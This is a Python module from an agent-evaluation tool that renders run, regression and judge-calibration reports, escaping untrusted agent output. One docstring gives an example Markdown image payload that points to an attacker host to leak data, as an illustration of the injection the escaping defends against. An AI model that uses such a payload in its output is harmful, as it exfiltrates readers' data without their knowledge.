"""Markdown and plain-text rendering of runs, comparisons and calibration reports.

Anything that came from an agent (output, tool arguments, error messages) is untrusted. It is
stripped of control characters, truncated, and placed inside a code fence that is longer than
any run of backticks it contains, so it cannot inject Markdown or terminal escape sequences
into a report.
"""

from __future__ import annotations

import json
import re

from .judge.calibration import CalibrationReport
from .metrics import Rate, RunMetrics, compute_metrics
from .models import CaseResult, RunResult
from .regression import CaseChange, MetricChange, RegressionReport
from .storage import RunInfo
from .taxonomy import DESCRIPTIONS
from .text import strip_control, truncate

DISCLAIMER = (
    "Passing these cases shows how the agent behaved on this synthetic suite. It does not "
    "prove that the agent is reliable or secure."
)
COST_NOTE = "Cost is an estimate: reported tokens multiplied by the price table named below."


def plain(text: object, limit: int = 300) -> str:
    """One line of untrusted text for a place that interprets no markup.

    Use for terminals, data-frame cells and widget option labels: control characters are
    removed, whitespace is collapsed and the text is truncated.
    """
    return truncate(" ".join(strip_control(str(text)).split()), limit)


def inline(text: object, limit: int = 300) -> str:
    """Untrusted text as a Markdown code span, safe inside a paragraph or a table cell.

    Nothing inside a code span is interpreted, so a tool argument such as
    ``![x](https://attacker.example/?leak=...)`` cannot become an image that the reader's
    browser fetches, a link, or HTML. Backticks are replaced and pipes escaped.
    """
    body = plain(text, limit).replace("`", "'").replace("|", "\\|")
    return f"`{body}`" if body.strip() else "`(empty)`"


def fenced(text: object, limit: int = 2000) -> str:
    """Untrusted text in a code fence that its content cannot close."""
    body = truncate(strip_control(str(text)), limit)
    longest = max((len(run) for run in re.findall(r"`+", body)), default=0)
    fence = "`" * max(3, longest + 1)
    return f"{fence}text\n{body}\n{fence}"


def percent(value: float | None, digits: int = 1) -> str:
    return "n/a" if value is None else f"{value * 100:.{digits}f}%"


def rate(value: Rate, with_interval: bool = True) -> str:
    if value.rate is None:
        return "n/a (0 applicable)"
    text = f"{percent(value.rate)} ({value.successes}/{value.total})"
    if with_interval and value.low is not None and value.high is not None:
        text += f", Wilson 95% interval {percent(value.low)} to {percent(value.high)}"
    return text


def number(value: float | None, digits: int = 0, unit: str = "") -> str:
    return "n/a" if value is None else f"{value:,.{digits}f}{unit}"


def money(value: float | None) -> str:
    return "n/a" if value is None else f"${value:,.4f}"


def _failure_block(result: CaseResult) -> list[str]:
    lines = [f"### {inline(result.case_id, 100)} ({result.category}), trial {result.trial}", ""]
    for evaluation in result.evaluations:
        for item in evaluation.failures():
            lines.append(f"- **{evaluation.evaluator}** / {item.code}: {inline(item.message, 400)}")
    calls = result.trace.tool_calls
    if calls:
        shown = ", ".join(f"{call.tool}{'' if call.ok else ' (failed)'}" for call in calls[:12])
        more = f", … {len(calls) - 12} more" if len(calls) > 12 else ""
        lines.append(f"- tool calls: {inline(shown, 400)}{more}")
    lines += [
        "",
        f"Ended as `{result.trace.status}`. Output:",
        "",
        fenced(result.trace.output, 800),
        "",
    ]
    return lines


def render_run_report(
    run: RunResult, metrics: RunMetrics | None = None, max_failures: int = 15
) -> str:
    """A Markdown report for one run."""
    m = metrics or compute_metrics(run)
    lines = [
        f"# Agent reliability report: {inline(f'{run.agent_name} {run.agent_version}', 140)}",
        "",
        f"Suite {inline(run.suite_name, 100)} (version {inline(run.suite_version, 40)}), "
        f"{m.cases} cases x {m.trials} trial(s), seed {run.config.seed}. "
        f"Run `{run.run_id}` created {run.created_at} with Agent Reliability Lab "
        f"{run.arl_version}."
        + (f" Fault profile: `{run.config.fault_profile}`." if run.config.fault_profile else ""),
        "",
        f"> {DISCLAIMER}",
        "",
        "## Summary",
        "",
        "| Metric | Value |",
        "|---|---|",
        "| Pass rate (a case passes only if every trial passes every check) | "
        f"{rate(m.pass_rate)} |",
        f"| Task success rate | {rate(m.task_success_rate)} |",
        f"| Tool-call accuracy | {rate(m.tool_call_accuracy)} |",
        f"| Tool-call precision / recall (pooled) | {percent(m.tool_call_precision)} / "
        f"{percent(m.tool_call_recall)} |",
        f"| Failure rate (case-trials) | {percent(m.failure_rate)} |",
        "| Runs stopped by the harness (crash, timeout, runaway loop) | "
        f"{rate(m.error_rate, False)} |",
        f"| Tool calls / retries / retry rate | {m.tool_calls:,} / {m.retries:,} / "
        f"{percent(m.retry_rate)} |",
        f"| Injected faults seen | {m.injected_faults:,} |",
        f"| Latency p50 / p90 / p95 / p99 (accounted) | {number(m.latency.p50_ms, 0)} / "
        f"{number(m.latency.p90_ms, 0)} / {number(m.latency.p95_ms, 0)} / "
        f"{number(m.latency.p99_ms, 0)} ms |",
        f"| Tokens in / out | {m.input_tokens:,} / {m.output_tokens:,} |",
        f"| Estimated cost, total / mean per case-trial | {money(m.estimated_cost_usd)} / "
        f"{money(m.mean_cost_usd_per_trial)} |",
        "",
        f"{COST_NOTE} Price table: {inline(m.price_table, 60)}."
        + (
            f" {m.unpriced_trials} case-trial(s) used a model with no price."
            if m.unpriced_trials
            else ""
        ),
        "",
    ]
    if m.flaky_cases:
        lines += [
            f"**Flaky cases** (passed some trials, failed others): "
            f"{', '.join(inline(c, 100) for c in m.flaky_cases)}",
            "",
        ]
    lines += [
        "## By category",
        "",
        "| Category | Cases | Pass rate | Task success | Mean latency | Mean est. cost |",
        "|---|---|---|---|---|---|",
    ]
    for category in m.categories:
        lines.append(
            f"| {category.category} | {category.cases} | {rate(category.pass_rate, False)} | "
            f"{rate(category.task_success_rate, False)} | "
            f"{number(category.mean_latency_ms, 0, ' ms')} | "
            f"{money(category.mean_cost_usd)} |"
        )
    lines += [
        "",
        "## By evaluator",
        "",
        "| Evaluator | Applicable | Passed | Failed |",
        "|---|---|---|---|",
    ]
    for evaluator in m.evaluators:
        lines.append(
            f"| {evaluator.evaluator} | {evaluator.applicable} | {evaluator.passed} | "
            f"{evaluator.failed} |"
        )
    lines += ["", "## Error taxonomy", ""]
    if m.taxonomy:
        lines += ["| Failure category | Case-trials | Meaning |", "|---|---|---|"]
        for category_name, count in m.taxonomy.items():
            lines.append(f"| {category_name} | {count} | {DESCRIPTIONS.get(category_name, '')} |")
    else:
        lines.append("No failures.")
    failures = [result for result in run.results if not result.passed]
    lines += ["", f"## Failures ({len(failures)} case-trial(s))", ""]
    if not failures:
        lines.append("None.")
    for result in failures[:max_failures]:
        lines += _failure_block(result)
    if len(failures) > max_failures:
        lines.append(f"… {len(failures) - max_failures} more failure(s) not shown.")
    return "\n".join(lines).rstrip() + "\n"


def _changes(title: str, changes: list[CaseChange]) -> list[str]:
    if not changes:
        return []
    lines = [
        f"### {title} ({len(changes)})",
        "",
        "| Case | Category | Baseline | Candidate | Failing checks |",
        "|---|---|---|---|---|",
    ]
    for change in changes:
        lines.append(
            f"| {inline(change.case_id, 100)} | {change.category} | {change.baseline} "
            f"({change.baseline_passes}) | {change.candidate} ({change.candidate_passes}) | "
            f"{', '.join(change.failed_evaluators) or '-'} |"
        )
    return [*lines, ""]


def _metric_row(change: MetricChange | None, label: str, digits: int) -> str:
    if change is None:
        return f"| {label} | n/a | n/a | n/a | n/a | not compared |"
    relative = "n/a" if change.relative is None else f"{change.relative:+.1%}"
    return (
        f"| {label} | {change.baseline_mean:,.{digits}f} | {change.candidate_mean:,.{digits}f} | "
        f"{change.difference:+,.{digits}f} ({relative}) | {change.low:+,.{digits}f} to "
        f"{change.high:+,.{digits}f} | {change.direction} |"
    )


VERDICT_TEXT = {
    "regression": "REGRESSION: reliability dropped, and the drop is statistically significant.",
    "needs_review": (
        "NEEDS REVIEW: something got worse, but a reliability drop is not statistically "
        "established."
    ),
    "improved": "IMPROVED: nothing got worse and something got better.",
    "no_change": "NO CHANGE: no case changed outcome and cost and latency did not move materially.",
}


def render_comparison(report: RegressionReport) -> str:
    """A Markdown report comparing a candidate run with a baseline."""
    b, c = report.baseline, report.candidate
    lines = [
        "# Regression report",
        "",
        f"Baseline: {inline(f'{b.agent} {b.version}', 140)} (run `{b.run_id}`, {b.created_at})  ",
        f"Candidate: {inline(f'{c.agent} {c.version}', 140)} (run `{c.run_id}`, {c.created_at})  ",
        f"Suite {inline(c.suite, 100)}, {report.cases_compared} cases compared, "
        f"{c.trials} trial(s) per case.",
        "",
        f"## Verdict: {VERDICT_TEXT[report.verdict]}",
        "",
    ]
    lines += [f"- {reason}" for reason in report.reasons]
    if report.warnings:
        lines += ["", "**Warnings**", ""] + [f"- {warning}" for warning in report.warnings]
    lines += [
        "",
        "## Reliability",
        "",
        "| | Baseline | Candidate |",
        "|---|---|---|",
        f"| Pass rate | {rate(report.baseline_pass_rate)} | {rate(report.candidate_pass_rate)} |",
        "",
        f"Cases that stopped passing consistently: **{report.stopped_passing}**. "
        f"Cases that started passing consistently: **{report.started_passing}**. "
        f"Exact McNemar test (two-sided): p = {report.p_value:.4f} at alpha = {report.alpha:g}.",
        "",
    ]
    lines += _changes("Newly failing", report.newly_failing)
    lines += _changes("Fixed", report.fixed)
    lines += _changes("Flaky in either run", report.flaky)
    if report.still_failing:
        lines += [
            f"Still failing in both runs ({len(report.still_failing)}): "
            + ", ".join(inline(case, 100) for case in report.still_failing),
            "",
        ]
    lines += [
        "## Cost and latency",
        "",
        "Mean per case, candidate minus baseline, with a 95% bootstrap interval for the "
        f"difference. A change counts only if the interval excludes zero and the relative "
        f"change is at least {report.tolerance:.0%}.",
        "",
        "| Metric | Baseline | Candidate | Difference | 95% interval | Result |",
        "|---|---|---|---|---|---|",
        _metric_row(report.latency, "Latency (ms, accounted)", 0),
        _metric_row(report.cost, "Estimated cost (USD)", 5),
        "",
        f"> {DISCLAIMER}",
    ]
    return "\n".join(lines).rstrip() + "\n"


def render_calibration(report: CalibrationReport) -> str:
    """A Markdown report for a judge calibration."""
    cm = report.confusion
    lines = [
        f"# Judge calibration: {inline(report.judge, 100)}",
        "",
        f"Rubric {inline(report.rubric, 100)}, {report.labelled} labelled item(s) of "
        f"{report.items}. Review policy: minimum confidence {report.policy.min_confidence:g}, "
        f"ambiguity margin {report.policy.ambiguity_margin:g}, {report.policy.samples} reading(s) "
        "per item.",
        *(["", f"Dataset: {inline(report.dataset, 600)}"] if report.dataset else []),
        "",
        "| Label in the dataset | Judge: pass | Judge: fail | Sent to human review |",
        "|---|---|---|---|",
        f"| pass | {cm.true_pass} | {cm.false_fail} | {cm.review_of_pass} |",
        f"| fail | {cm.false_pass} | {cm.true_fail} | {cm.review_of_fail} |",
        "",
        "| Metric | Value |",
        "|---|---|",
        f"| Decided by the judge | {report.decided} of {report.labelled} |",
        f"| Sent to human review | {report.needs_review} ({percent(report.review_rate)}) |",
        f"| Agreement with the labels (decided items) | {rate(report.agreement)} |",
        "| Cohen's kappa (decided items) | "
        + ("undefined" if report.kappa is None else f"{report.kappa:.3f}")
        + " |",
        f"| False positive rate (bad answer passed) | {rate(report.false_positive_rate)} |",
        f"| False negative rate (good answer failed) | {rate(report.false_negative_rate)} |",
        "",
    ]
    if report.review_reasons:
        reasons = ", ".join(f"{name}: {count}" for name, count in report.review_reasons.items())
        lines += [f"Reasons for human review: {reasons}.", ""]
    if report.disagreements:
        lines += [
            "## Disagreements",
            "",
            "| Item | Human | Judge | Score | Confidence | Note |",
            "|---|---|---|---|---|---|",
        ]
        for item in report.disagreements[:50]:
            lines.append(
                f"| {inline(item.item_id, 100)} | {item.human} | {item.judge} | "
                f"{number(item.score, 2)} | {number(item.confidence, 2)} | "
                f"{inline(item.note, 120) if item.note else ''} |"
            )
        lines.append("")
    lines.append(
        "> A judge is an opinion with an error rate. Use it for a decision only if the rates "
        "above are acceptable for that decision, and keep the human-review rule on."
    )
    return "\n".join(lines).rstrip() + "\n"


def render_run_list(infos: list[RunInfo]) -> str:
    """A plain-text table of stored runs."""
    if not infos:
        return "No stored runs.\n"
    rows = [("RUN", "SUITE", "AGENT", "VERSION", "CREATED", "TRIALS", "PASSED")]
    for info in infos:
        rows.append(
            (
                plain(info.name, 80),
                plain(info.suite, 30),
                plain(info.agent, 30),
                plain(info.version, 15),
                info.created_at,
                str(info.trials),
                f"{info.passed}/{info.total} ({info.pass_rate:.0%})",
            )
        )
    widths = [max(len(row[column]) for row in rows) for column in range(len(rows[0]))]
    return (
        "\n".join(
            "  ".join(cell.ljust(width) for cell, width in zip(row, widths, strict=True)).rstrip()
            for row in rows
        )
        + "\n"
    )


def to_json(model: RunMetrics | RegressionReport | CalibrationReport) -> str:
    return json.dumps(model.model_dump(mode="json"), indent=2, ensure_ascii=False) + "\n"
